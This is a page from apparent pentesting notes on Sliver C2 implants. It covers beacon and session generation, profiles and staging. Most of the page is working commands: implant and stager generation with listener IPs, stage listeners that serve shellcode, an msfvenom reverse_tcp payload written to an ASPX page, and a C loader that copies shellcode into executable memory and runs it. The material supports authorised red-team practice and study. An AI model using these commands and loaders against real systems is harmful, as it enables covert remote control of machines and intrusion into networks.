| üè† [Home](../../pentesting.md) | ‚¨ÖÔ∏è ‚¨ÖÔ∏è [Part](../_part) | ‚¨ÖÔ∏è [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

-   [Implants](#implants){#toc-implants}
    -   [Introduction](#introduction){#toc-introduction}
    -   [Beacon](#beacon){#toc-beacon}
    -   [Session](#session){#toc-session}
    -   [Named pipes](#named-pipes){#toc-named-pipes}
    -   [Profiles](#profiles){#toc-profiles}
    -   [Staging](#staging){#toc-staging}
    -   [Notes](#notes){#toc-notes}

# Implants

## Introduction

They offer network connections on different sets of protocols and a
means of communication between a C2 server and the target
workstation/server.

Implants can operate in:

-   **beacon mode** Implant operates in intervals, resulting in the execution of commands at a set period. Beacons can be upgraded to sessions.

-   **session mode** enables the ability to have immediate execution of commands by the operator

implants format are:

-   `exe` (default)

-   `shared`: for dynamic libraries

-   `service`: for a windows service binary to use with `psexec`

-   `shellcode`:

## binaries location
shellcode is located in `/root/.sliver/slivers/windows/amd64`

## multi domains
* [multi-domains](https://sliver.sh/docs?name=HTTPS%20C2#multiple-domains)

## proxy and Advanced Options

[Advanced options](https://sliver.sh/docs?name=C2+Advanced+Options) are configured per-C2 endpoint and are passed as URL encoded parameters to the C2 URL in the generate command. For example:
```bash
generate --http http://example.com?driver=wininet
```

The implant attempts to [auto-detect proxy](https://sliver.sh/docs?name=HTTPS%20C2#proxies) settings using a modified version of the go-get-proxied library. 


## beacons

* **Generate**:
```bash
generate beacon -N <beacon_name> --http <server_ip>:<port> --skip-symbols  --os windows --seconds <sec> --jitter <sec>
generate beacon -N <beacon_name> --mtls <server_ip>:<port> --skip-symbols  --os windows --seconds <sec> --jitter <sec>
```
* **Reconfig**:
```bash
reconfig -i 5s -j 1s
```
* **Utilisation**:
```bash
use <id>
```
* **tasks performed**:
```bash
tasks
tasks fetch <id>
info
```

`interactive` enable session mode of a beacon. Actually it queue a task that will attempt to establish a session. By defaukt the session will be created with the same C2 protocol used by the beacon. another method can be specified by providine proper parameters to `interactive`

## Session
```bash
generate --http <server_ip>:<port> --skip-symbols -N <beacon_name> --os windows 
generate --mtls <server_ip>:<port> --skip-symbols -N <beacon_name> --os windows

to stop using a session:
```bash
background
```
to exit a session it must be killed
```bash
sessions -k <id>
```
## Named pipes

see pivot section

## Profiles

allow to create beacon templates:
```bash
profiles new beacon --arch amd64 --os windows --mtls 10.10.10.10:443 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 <template_name>

profiles new beacon -http  http://10.10.16.179:80/sliver/initial --format shellcode --arch amd64 --seconds 15 --jitter 1 b_sliv_fh    
```
or session template:
```bash
profiles new --arch amd64 --os windows --mtls 10.10.10.10:443  <template_name>
profiles new -http  http://10.10.16.179:80/sliver/initial --format shellcode --arch amd64 sliv_fh
```
to generate a beacon from a template
```bash
profiles generate --save . <template_name>
```
## Staging

For comparison see:
* [Staged vs Stageless Payloads](https://blog.spookysec.net/stage-v-stageless-1/)
* [Red Teaming Tactics: Unlocking The Power of Custom Staged Payloads w/ Metasploit](https://medium.com/@nickswink7/red-teaming-tactics-unlocking-the-power-of-custom-staged-payloads-w-metasploit-d3db71567572)
* [Learning Sliver C2 (06) - Stagers: Basics](https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/)

As payloads can be pretty big (around 10MB), you may sometime require
the use of [stagers](https://sliver.sh/docs?name=Stagers) to execute
your implant on a target system. Sliver supports the meterpreter staging
protocol over TCP and HTTP(S). This protocol is pretty straight forward:

-   read the size of the stage 2 payload on the wire (the first 4 bytes
    for the TCP stager)

-   download the stage 2

-   allocate the size read in the first step, and write the stage in
    memory

For this to work, we need the following pieces:

-   a staging server (the Sliver server)

-   a stage 2 payload (usually a Sliver shellcode, but can be in other
    formats)

-   stagers or dropper (generated by msfvenom, the Sliver generate
    stager command, or a custom one)

Sliver implements staging by reusing the profiles feature. Profiles are sorts of implant blueprints that define a configuration to be reused by the `profiles new` command.
```bash
profiles new -h
profiles new beacon --arch amd64 --os windows --mtls 10.10.69.24:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 funnier_bytes
profiles new --http 10.10.14.62:8088 --format shellcode htb
```

then create a stagging listener and link it to the profile
```bash
stage-listener --url http://10.10.69.24:8080 --profile funnier_bytes --prepend-size
stage-listener --url tcp://10.10.14.62:4443 --profile htb
```

Then start the listener catch the stage 2 payload callback
```bash
mtls --lhost 10.10.69.24 --lport 443
http -L 10.10.14.62 -l 8088 --website delivery
```

then generate the Generate a new sliver stager shellcode to include in the stager (msfvenom). A sliver stager is very small pieces of shellcode communicating with your stage listener. (it downlaod the beacon shell code and run it)
```bash
generate stager -r http --lhost 10.10.69.24 --lport 8080
generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
```

generate a stager with msfvenom or develop or new one
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=8088 -f aspx > sliver.aspx
```

Next, we would need to take the generated payload in `staged.txt` and
change the payload in the `Page_Load` function. The `byte[]` array will
be defined with a different name; it is pretty important to put the
`new byte[511]` array from `staged.txt` into the `byte[] mO0UY`
declaration in the example below in the `sliver.aspx` file.

        protected void Page_Load(object sender, EventArgs e)
        {
            byte[] mO0UY = new byte[511] {0xfc,0x...

Check [Malware Development for Dummies](https://github.com/chvancooten/maldev-for-dummies) for more info on developing your own loaders and droppers.

    #include <windows.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    // change this out for the shellcode you're using!
    unsigned char payload[3] = {
        0x90, 0x90, 0xcc
    };
    unsigned int payload_len = sizeof(payload);

    int main(void) {
        
        void * exec_mem;
        BOOL rv;
        HANDLE th;
        DWORD oldprotect = 0;

        // Allocate a memory buffer for payload
        exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        // Copy payload to new buffer
        RtlMoveMemory(exec_mem, payload, payload_len);

        // Make new buffer as executable
        rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

        // If VirtualProtect worked, run the payload
        if ( rv != 0 ) {
                th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
                WaitForSingleObject(th, -1);
        }

        return 0;
    }

## Notes

-   [Stager generating code](https://github.com/BishopFox/sliver/blob/93e772f5bf81c59ca25033e1d6d40138f615b4b8/client/command/generate/generate-stager.go)

-   [Stage generating code](https://github.com/BishopFox/sliver/blob/93e772f5bf81c59ca25033e1d6d40138f615b4b8/client/command/generate/generate.go#L599)


